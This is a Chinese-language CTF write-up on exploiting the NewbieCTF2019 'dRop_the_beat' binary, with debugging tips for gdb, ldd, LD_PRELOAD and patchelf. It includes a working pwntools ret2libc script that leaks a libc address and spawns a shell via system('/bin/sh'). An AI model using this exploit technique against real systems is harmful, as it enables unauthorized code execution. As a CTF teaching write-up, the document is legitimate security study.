# EXP和调试的小坑-1

以NewbieCTF2019的**dRop_the_beat**为例子，记录了一下撰写EXP和调试的一些小坑和技巧

首先检测这个程序

```
syc@ubuntu:~/Desktop/share/NewbieCTF/Pwnable/dRop_the_beat$ checksec drop_the_beat_easy
[*] '/mnt/hgfs/share/NewbieCTF/Pwnable/dRop_the_beat/drop_the_beat_easy'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

就只是开启了栈不可执行的保护，然后用IDA Pro打开查看一下源代码

```cc
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+0h] [ebp-68h]
  char buf; // [esp+4h] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  puts("      dP  888888ba   .88888.   888888ba       dP   dP                   dP                           dP   ");
  puts("      88  88    `8b d8'   `8b  88    `8b      88   88                   88                           88   ");
  puts(".d888b88 a88aaaa8P' 88     88 a88aaaa8P'    d8888P 88d888b. .d8888b.    88d888b. .d8888b. .d8888b. d8888P ");
  puts("88'  `88  88   `8b. 88     88  88             88   88'  `88 88ooood8    88'  `88 88ooood8 88'  `88   88   ");
  puts("88.  .88  88     88 Y8.   .8P  88             88   88    88 88.  ...    88.  .88 88.  ... 88.  .88   88   ");
  puts("`88888P8  dP     dP  `8888P'   dP             dP   dP    dP `88888P'    88Y8888' `88888P' `88888P8   dP   ");
  puts("oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo");
  puts(&byte_80489F3);
  puts("dROP The beat(easy version)");
  puts(&byte_80489F3);
  puts("1) Give Him a Beat!");
  puts("2) No Beat For You..!");
  __isoc99_scanf("%d", &v4);
  if ( v4 != 1 )
  {
    puts(":( Sorry, You Can't be with us...");
    exit(1);
  }
  puts("Give Me a Beat!!");
  read(0, &buf, 0x12Cu);
  puts(&buf);
  puts("Wow... That's AWESOME!");
  return 0;
}
```

很简单的栈溢出然后ROP的题目，大概思路就是暴露libc版本和地址即可，然后我写了一个错误的EXP

```python
from pwn import *
p = process("./drop_the_beat_easy",env={"LD_PRELOAD":"./libc.so.6"})
elf = ELF('./drop_the_beat_easy')
libc = ELF('./libc.so.6')
#gdb.attach(p,"b*0x08048672")
libc_start_main_got = elf.got['__libc_start_main']
puts_plt = elf.plt['puts']
main = elf.symbols['main']
payload = "A"*104+p32(puts_plt)+p32(libc_start_main_got)+p32(main)
p.recvuntil('2) No Beat For You..!\n')
p.sendline("1")
p.recvuntil('Give Me a Beat!!\n')
p.send(payload)
p.recvuntil("Wow... That's AWESOME!\n")
#info(p.recv())
libc.address = u32(p.recv(4)) - libc.symbols['__libc_start_main']
info("libc : " + hex(libc.address))
p.interactive()
```

我的payload写错了，应该是**main**作为函数的返回地址，**libc**作为第一个参数

```cc
payload = "A"*104+p32(puts_plt)+p32(main)+p32(libc_start_main_got)
```

这里想说的是如何检查自己的payload是否书写正确，就是最后的返回地址**EIP**是否劫持成功，这里有一个下断点的小技巧，我们一般下在溢出函数后的一个`leave`指令处

例如这题的汇编代码

```cc
.text:0804864F                 call    _puts
.text:08048654                 add     esp, 4
.text:08048657                 mov     eax, 0
.text:0804865C                 jmp     short locret_8048672
.text:0804865E ; ---------------------------------------------------------------------------
.text:0804865E
.text:0804865E loc_804865E:                            ; CODE XREF: main+E1↑j
.text:0804865E                 push    offset aSorryYouCanTBe ; ":( Sorry, You Can't be with us..."
.text:08048663                 call    _puts
.text:08048668                 add     esp, 4
.text:0804866B                 push    1               ; status
.text:0804866D                 call    _exit
.text:08048672 ; ---------------------------------------------------------------------------
.text:08048672
.text:08048672 locret_8048672:                         ; CODE XREF: main+121↑j
.text:08048672                 leave
.text:08048673                 retn
.text:08048673 ; } // starts at 804853B
.text:08048673 main            endp
.text:08048673
```

我们就一般下在**0x08048672**处，然后开始调试一遍错误的payload

```cc
────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0x0       
$ecx   : 0xffffffff
$edx   : 0xf7ed9870  →  0x00000000
$esp   : 0xffd211ac  →  0x080483e0  →  <puts@plt+0> jmp DWORD PTR ds:0x804a010
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0xf7ed8000  →  0x001b1db0
$edi   : 0xf7ed8000  →  0x001b1db0
$eip   : 0x08048673  →  <main+312> ret 
$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffd211ac│+0x0000: 0x080483e0  →  <puts@plt+0> jmp DWORD PTR ds:0x804a010	 ← $esp
0xffd211b0│+0x0004: 0x0804a018  →  0xf7d3e540  →  <__libc_start_main+0> call 0xf7e45b59 <__x86.get_pc_thunk.ax>
0xffd211b4│+0x0008: 0x0804853b  →  <main+0> push ebp
0xffd211b8│+0x000c: 0xffd2124c  →  0xffd2330d  →  "QT_QPA_PLATFORMTHEME=appmenu-qt5"
0xffd211bc│+0x0010: 0x00000000
0xffd211c0│+0x0014: 0x00000000
0xffd211c4│+0x0018: 0x00000000
0xffd211c8│+0x001c: 0xf7ed8000  →  0x001b1db0
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048667 <main+300>       inc    DWORD PTR [ebx+0x16a04c4]
    0x804866d <main+306>       call   0x80483f0 <exit@plt>
    0x8048672 <main+311>       leave  
 →  0x8048673 <main+312>       ret    
   ↳   0x80483e0 <puts@plt+0>     jmp    DWORD PTR ds:0x804a010
```

可以发现函数的返回地址是错误的，然后我们运行一遍正确的payload

```
$eax   : 0x0       
$ebx   : 0x0       
$ecx   : 0xffffffff
$edx   : 0xf7f9a870  →  0x00000000
$esp   : 0xffddb3fc  →  0x080483e0  →  <puts@plt+0> jmp DWORD PTR ds:0x804a010
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0xf7f99000  →  0x001b1db0
$edi   : 0xf7f99000  →  0x001b1db0
$eip   : 0x08048673  →  <main+312> ret 
$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffddb3fc│+0x0000: 0x080483e0  →  <puts@plt+0> jmp DWORD PTR ds:0x804a010	 ← $esp
0xffddb400│+0x0004: 0x0804853b  →  <main+0> push ebp
0xffddb404│+0x0008: 0x0804a018  →  0xf7dff540  →  <__libc_start_main+0> call 0xf7f06b59 <__x86.get_pc_thunk.ax>
0xffddb408│+0x000c: 0xffddb49c  →  0xffddd30d  →  "QT_QPA_PLATFORMTHEME=appmenu-qt5"
0xffddb40c│+0x0010: 0x00000000
0xffddb410│+0x0014: 0x00000000
0xffddb414│+0x0018: 0x00000000
0xffddb418│+0x001c: 0xf7f99000  →  0x001b1db0
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048667 <main+300>       inc    DWORD PTR [ebx+0x16a04c4]
    0x804866d <main+306>       call   0x80483f0 <exit@plt>
    0x8048672 <main+311>       leave  
 →  0x8048673 <main+312>       ret    
   ↳   0x80483e0 <puts@plt+0>     jmp    DWORD PTR ds:0x804a010
       0x80483e6 <puts@plt+6>     push   0x8
       0x80483eb <puts@plt+11>    jmp    0x80483c0
       0x80483f0 <exit@plt+0>     jmp    DWORD PTR ds:0x804a014
       0x80483f6 <exit@plt+6>     push   0x10
       0x80483fb <exit@plt+11>    jmp    0x80483c0
```

可以发现返回地址正确了

总之第一点就是下断点可以下在`leave`处

还有就是在程序为完全静态编译没有调用动态库的时候也是可以知道一些相关的编译信息的

```
strings ./binary_name | grep GCC
确定Ubuntu多少版本和gcc版本
```

例如这题

```
syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$  strings ./drop_the_beat_easy | grep GCC
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
```

还有一个命令是可以查看当前程序的动态加载库

```
ldd
```

```
syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ ldd ./drop_the_beat_easy
	linux-gate.so.1 =>  (0xf7f18000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d41000)
	/lib/ld-linux.so.2 (0xf7f1a000)
```

然后在题目给了libc的情况下，我们的程序如果没有经过修改就运行的话，调用的是我们本机的libc库，所以我们需要修改他的动态加载库

在写exp的时候可以这样写

```
p = process("./drop_the_beat_easy",env={"LD_PRELOAD":"./libc.so.6"})
```

后面的env就是动态加载库的文件

我们还可以通过安装 patchelf 来直接重定位软件的动态加载库

```
patchelf  --set-interpreter /mnt/hgfs/shared/multi_version_ld/ld-2.23_x86-64.so.2 ./babystack
```

patchelf 的更多命令还是通过help进行查看

```cc
syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ patchelf --help
syntax: patchelf
  [--set-interpreter FILENAME]
  [--page-size SIZE]
  [--print-interpreter]
  [--print-soname]		Prints 'DT_SONAME' entry of .dynamic section. Raises an error if DT_SONAME doesn't exist
  [--set-soname SONAME]		Sets 'DT_SONAME' entry to SONAME.
  [--set-rpath RPATH]
  [--remove-rpath]
  [--shrink-rpath]
  [--print-rpath]
  [--force-rpath]
  [--add-needed LIBRARY]
  [--remove-needed LIBRARY]
  [--replace-needed LIBRARY NEW_LIBRARY]
  [--print-needed]
  [--no-default-lib]
  [--debug]
  [--version]
  FILENAME
```

还有就是接受的问题，有时候接受可能会多一个或者少一个换行符，可以先用recv一次全部查看一下接受的内容

最后最终的EXP就是

```python
from pwn import *
p = process("./drop_the_beat_easy",env={"LD_PRELOAD":"./libc.so.6"})
elf = ELF('./drop_the_beat_easy')
libc = ELF('./libc.so.6')
#gdb.attach(p,"b*0x08048672")
libc_start_main_got = elf.got['__libc_start_main']
puts_plt = elf.plt['puts']
main = elf.symbols['main']

print hex(main)
print hex(puts_plt)

payload = "A"*104+p32(puts_plt)+p32(main)+p32(libc_start_main_got)

p.recvuntil('2) No Beat For You..!\n')
p.sendline("1")
p.recvuntil('Give Me a Beat!!\n')
p.send(payload)

p.recvuntil("Wow... That's AWESOME!\n")

#info(p.recv())
libc.address = u32(p.recv(4)) - libc.symbols['__libc_start_main']
info("libc : " + hex(libc.address))


print hex(libc.symbols["system"])
print hex(libc.search("/bin/sh\x00").next())

payload = "A"*104+p32(libc.symbols["system"])*2+p32(libc.search("/bin/sh\x00").next())

p.recvuntil('2) No Beat For You..!\n')
p.sendline("1")
p.recvuntil('Give Me a Beat!!\n')
p.send(payload)


p.interactive()
```

还有就是可以在 `/usr/include/asm/unistd_32.h`直接查看32位系统的系统调用号，配合`grep`效果更好

```c
syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ cat /usr/include/asm/unistd_64.h | grep execve
#define __NR_execve 59
#define __NR_execveat 322
```

还有就是熟练使用ROPgadget生成ROP chain